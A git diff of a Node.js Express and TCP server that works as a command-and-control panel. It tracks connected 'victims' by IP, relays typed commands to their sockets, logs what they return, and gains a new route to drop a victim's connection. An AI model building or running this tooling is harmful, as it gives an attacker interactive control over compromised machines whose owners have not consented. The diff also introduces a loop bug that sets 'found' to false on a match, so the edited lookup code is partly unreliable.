@@ -1,6 +1,6 @@
 var express = require('express');
 var bodyParser = require('body-parser');
-var nunjucks = require('nunjucks');     // Templating language inspired in jinja2
+var nunjucks = require('nunjucks');
 var net = require('net');
 var date = require('./dateFormat');
 
@@ -12,6 +12,7 @@ nunjucks.configure('views', {
 });
 
 /************************ TCP server **********************/
+
 var tcpPort = 1337;
 var victims = [];
 var commandLine = '';
@@ -49,8 +50,8 @@ function initializeCommandLine(victim){
 function waitForResponse(socket) {
     return new Promise((resolve) => {           // Promise to resolve in the future
         socket.once('data', function(data) {    // Note that we register the event listener once, otherwise, it would apply every time there is a response
-            commandLine += data;
-            console.log('%s Victim %s responded: %s', date.format(), socket.remoteAddress, data);
+            commandLine += data + '\n';
+            console.log('%s Victim %s responded:\n%s', date.format(), socket.remoteAddress, data);
             resolve(true);
         });
         socket.once('close', function() {
@@ -74,13 +75,15 @@ app.get('/', function (req, res) {
     }
 })
 
-app.get('/*.*.*.*', function (req, res) {
-    let i, found = false, victim;
-    
-    for (i = 0; i < victims.length; i++){
-        if (victims[i].socket.remoteAddress === req.url.substr(1)){
+app.get('/:ip', function (req, res) {
+    let i = 0, found = false, victim;
+
+    while (i < victims.length && !found){
+        if (victims[i].socket.remoteAddress === req.params.ip){
             victim = victims[i];
+            found = false;
         }
+        i++;
     }
     if (!victim){
         res.redirect(303, '/');
@@ -91,13 +94,15 @@ app.get('/*.*.*.*', function (req, res) {
     }
 })
 
-app.post('/*.*.*.*', function (req, res) {
-    let i, found = false, victim;
-    
-    for (i = 0; i < victims.length; i++){
-        if (victims[i].socket.remoteAddress === req.url.substr(1)){
+app.post('/:ip', function (req, res) {
+    let i = 0, found = false, victim;
+
+    while (i < victims.length && !found){
+        if (victims[i].socket.remoteAddress === req.params.ip){
             victim = victims[i];
+            found = false;
         }
+        i++;
     }
     if (!victim || !victim.initialized){
         res.redirect(303, '/');
@@ -115,6 +120,21 @@ app.post('/*.*.*.*', function (req, res) {
             }
         });
     }
+})
+
+app.post('/:ip/disconnect', function(req, res){
+    let i = 0, found = false;
+
+    while (i < victims.length && !found){
+        if (victims[i].socket.remoteAddress === req.params.ip){
+            victims[i].socket.destroy();
+            found = true;
+            console.log("%s Connection ended", date.format());
+        }
+        i++;
+    }
+ 
+    res.redirect(303, '/');
 })
 
 app.listen(8080);
